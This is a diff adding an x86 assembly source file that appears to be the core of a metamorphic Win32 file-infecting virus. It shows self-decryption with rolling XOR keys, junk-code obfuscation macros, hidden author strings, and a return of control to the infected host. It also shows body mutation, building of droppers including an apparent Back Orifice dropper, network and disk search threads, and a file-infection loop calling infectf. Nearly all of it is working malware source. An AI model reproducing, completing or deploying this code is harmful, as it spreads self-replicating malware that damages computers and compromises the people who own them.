@@ -1,0 +1,261 @@
+DEBUGOFF
+
+vinit  PROC
+       push eax
+
+       pushf
+       pushad
+
+FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_DOUBLE
+       mov esi,[DATA_OFS]
+       push data_size/4
+       pop ecx
+       mov edx,[key1]
+       mov ebx,[key2]
+FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_EAX+_DOUBLE
+       push esi
+  @@data:
+       lodsd
+       xor eax,edx
+       add edx,ebx
+       mov [esi-4],eax
+FREE4GARBLE _ESI+_ECX+_EDX+_EBX+_EAX+_DOUBLE+_FLAGS
+       loop @@data
+       pop dwo [DATA_OFS]
+
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       xor dwo [copyright],    'ag ,' xor ')c( '        ;hide/show author ;)
+       xor dwo [copyright+4],  'ator' xor 'ceV '
+       xor dwo [copyright+8],  '...' xor 'an'
+
+FREE4GARBLE _EAX+_DOUBLE
+       mov eax,[entrypoint]
+       mov [esp+8*4+4],eax
+
+FREE4GARBLE _FLAGS+_DOUBLE
+       call get_api_addresses
+       jz @@error_exit
+DEBUGSTR <API searching complete>
+
+FREE4GARBLE NOGARBLE
+       push 0
+       call @@thread_main
+       jmp vmain
+  @@thread_main:
+       call create_thread
+
+  @@error_exit:
+       popad
+       popf
+DEBUGSTR <jumping to host...>
+       ret
+vinit  ENDP
+
+
+;FREE4GARBLE NOGARBLE
+vmain  PROC
+       pushad
+
+FREE4GARBLE _EAX+_DOUBLE
+       call [_GetTickCount]
+       push 0
+       push 0
+       mov [seed],eax
+       call rnd
+       xor [key1],eax
+       call rnd
+
+       sub esp, SIZEOF_WIN32_FIND_DATA
+       xor eax,esp
+       xor [key2],eax
+
+       push esp
+       push 101h
+       call [_WSAStartup]
+
+       call build_body_from_genotype
+
+       mov eax, WORKSIZE*20
+       call alloc
+       push eax
+
+       push [mutant_size]
+       push [mutant_offset]
+       push eax         ;tmpmem
+FREE4GARBLE _ECX+_ESI+_DOUBLE
+       call mixbody
+
+       mov [mutant_size],ecx
+FREE4GARBLE _ECX+_ESI+_EAX+_DOUBLE
+       mov eax,ecx
+       call alloc
+       mov [mutant_offset],eax
+
+FREE4GARBLE _ECX+_ESI+_EAX+_EDI+_DOUBLE
+       mov edi,eax
+
+FREE4GARBLE _ECX+_ESI+_EDI+_DOUBLE
+       rep movsb
+
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       call free
+
+       call build_genotype_from_body
+
+       call build_dropper
+
+       call build_bo_dropper
+       call get_current_ip
+
+  IF BO_THREADS NE 0
+
+FREE4GARBLE _ECX+_DOUBLE
+       mov ecx, BO_THREADS
+  @@bo_scan_threads:
+       push ecx
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       push 0
+       call @@thread0
+  @@redo:
+       call sendping
+       push 10*1000
+       call [_Sleep]
+       jmp @@redo
+  @@thread0:
+       call create_thread
+FREE4GARBLE _ECX+_FLAGS+_DOUBLE
+       pop ecx
+       loop @@bo_scan_threads
+
+  ENDIF
+
+  IF MUAZZINS EQ TRUE
+FREE4GARBLE NOGARBLE
+       push 0
+       call @@thread_hybris
+       jmp load_hybris_plugins
+  @@thread_hybris:
+       call create_thread
+  ENDIF
+
+  IF DISKSEARCH EQ TRUE
+
+FREE4GARBLE NOGARBLE
+       push 0
+       call @@thread1
+       jmp disk_thread
+  @@thread1:
+FREE4GARBLE _EAX+_DOUBLE
+       call create_thread
+       push eax
+FREE4GARBLE NOGARBLE
+       push 0
+       call @@thread2
+       jmp net_thread
+  @@thread2:
+       call create_thread
+
+FREE4GARBLE _EAX+_DOUBLE
+       push eax
+       mov eax,esp
+
+       push -1
+       push TRUE
+       push eax
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       push 2
+       call [_WaitForMultipleObjects]
+       pop eax eax
+
+  ELSE
+
+FREE4GARBLE _ESI+_EDI+_DOUBLE
+       mov edi,esp
+       lea esi, search_mask
+FREE4GARBLE _ESI+_EDI+_EAX+_DOUBLE
+       call [_FindFirstFileA], esi, edi
+FREE4GARBLE _EAX+_EBX+_EDI+_DOUBLE
+       mov ebx,eax
+FREE4GARBLE _EDI+_EAX+_EBX+_FLAGS+_DOUBLE
+       inc eax
+       jz @@search_done_
+
+FREE4GARBLE _EDI+_ECX+_EBX+_DOUBLE
+       lea ecx,[edi.WFD_szFileName]
+       mov [fname], ecx
+
+FREE4GARBLE _EDI+_EBX+_DOUBLE
+  @@file_search:
+       push ebx edi
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       call infectf
+FREE4GARBLE _EDI+_EBX+_DOUBLE
+       pop edi ebx
+
+FREE4GARBLE _EDI+_EBX+_EAX+_DOUBLE
+       call [_FindNextFileA], ebx, edi
+FREE4GARBLE _EDI+_EBX+_EAX+_FLAGS+_DOUBLE
+       test eax, eax
+       jnz @@file_search
+
+FREE4GARBLE _EBX+_DOUBLE
+       call [_FindClose], ebx
+
+  ENDIF
+
+FREE4GARBLE ALLGARBLE+_DOUBLE
+  @@search_done_:
+       sub esp, -SIZEOF_WIN32_FIND_DATA
+       call [_WSACleanup]
+FREE4GARBLE NOGARBLE
+       popad
+       ret 4
+vmain  ENDP
+
+
+;FREE4GARBLE NOGARBLE
+create_thread PROC
+       pushad
+FREE4GARBLE ALLGARBLE+_DOUBLE
+       push esp
+       push esp
+       push 0
+       push dwo [esp+(8*4)+8+(3*4)]           ;param
+       push dwo [esp+(8*4)+4+(4*4)]           ;entrypoint
+       push 0
+       push 0
+FREE4GARBLE _EAX+_DOUBLE
+       call [_CreateThread]
+       pop ecx
+       mov dwo [esp+Pushad_eax],eax
+FREE4GARBLE NOGARBLE
+       popad
+       ret 4*2
+create_thread ENDP
+
+
+FREE4GARBLE NOGARBLE
+
+include rebuild.inc
+include lexo32.inc
+;include crc.inc
+include hash.inc
+include map.inc
+include import.inc
+include disasm.inc
+include insert.inc
+include export.inc
+include infectf.inc
+include rnd.inc
+include z_decode.inc
+include z_encode.inc
+include metamorp.inc
+include bo.inc
+include localnet.inc
+include search.inc
+include epo.inc
+include droppers.inc
+include mix_var.inc
+include hybris.inc
+
+vend:
